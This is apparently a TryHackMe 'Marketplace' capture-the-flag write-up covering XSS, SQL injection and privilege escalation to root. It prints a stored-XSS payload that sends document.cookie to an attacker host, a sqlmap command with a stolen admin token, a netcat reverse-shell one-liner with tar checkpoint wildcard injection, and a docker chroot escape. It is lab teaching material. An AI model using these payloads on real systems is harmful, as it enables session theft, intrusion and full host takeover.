# Recon
```
sudo nmap -sV -sC -O -p- -oN nmap.txt -Pn 10.10.73.172
```
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Marketplace/assets/1.png">

# Enumeration
We will start by browsing the website on port 80. We are welcomed by a website which shows us two messages of michael and jake. We tried login in as both users with simple passwords, but without any luck. Also tried if i could use SQL injection on the password field:
```
' OR 1=1;--
```
None of the above worked. But what i could do was create a new account (test:test) and add new messages. These were vulnerable to XSS attack:
```js
<script>alert('XSS');</script>
```
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Marketplace/assets/2.png">

<br>
I got kinda stuck for a moment. Not sure how we could abuse the fact that the website has a XSS vulnerability. I found out that we can report messages to a admin. We could then try to steal his cookie. After some searching around i found a usefull script that could help me: XSS-cookie-stealer.py.

> Download from https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py

Change the listening host in the script and run it. I added the following script as a message and reported it so it would be checked by an admin.
```js
<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.9.1.79:8888/?"+document.cookie},1010)</script>
```

> I used the script from JSshell.
>https://www.kitploit.com/2020/06/jsshell-javascript-reverse-shell-for.html
https://github.com/shelld3v/JSshell

We got the admin cookie:
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Marketplace/assets/3.png">

After changing the cookie in FireFox (under Web Developer ->Storage Inspector -> Cookies) we now have access to the admin page.
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Marketplace/assets/4.png">

As I browse around the admin panel i spot SQL queries on the different users:
```
http://10.10.73.172/admin?user=1
```
We could try if the website is vulnerable to SQL injection. We'll have to add the admin cookie as parameter:
```
sqlmap -u "http://10.10.73.172/admin?user=1" --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NDI3NjQ3ODN9.QOwcf_d5Dc8HqridxucamgHW0vhlZMLC770K24YHBoU' -dump --technique=U --delay=2
```

We get hashes from users but i was unable to crack them.
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Marketplace/assets/5.png">

Spotted a message with a password:
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Marketplace/assets/6.png">
```
@b_ENXkGYUCAv3zJ
```

# Initial foothold
Let's try to connect with SSH with the known usernames and this password:
```
ssh jake@10.10.172.147
```

We got a shell and got user. User michael didn't work.

# Privilege escalation
With ```sudo -l``` we spot a script that michael can run with sudo rights:
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Marketplace/assets/8.png">

I knew there was a way to exploit the wildcard in tar for privilege escalation.
> Read this post: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.2.169 4444 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```


But running the script with ```sudo -u michael /opt/backups/backup.sh``` command give me an error so I decided to move the backup.tar to bk.tar and again run this command because on backup.tar only jake has privileges so after I changed the backup.tar to bk.tar. I again run the command  and this time I got a reverse connection as user michael.

This user is also in the docker group. Searched GTFOBin and found:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
We are now root



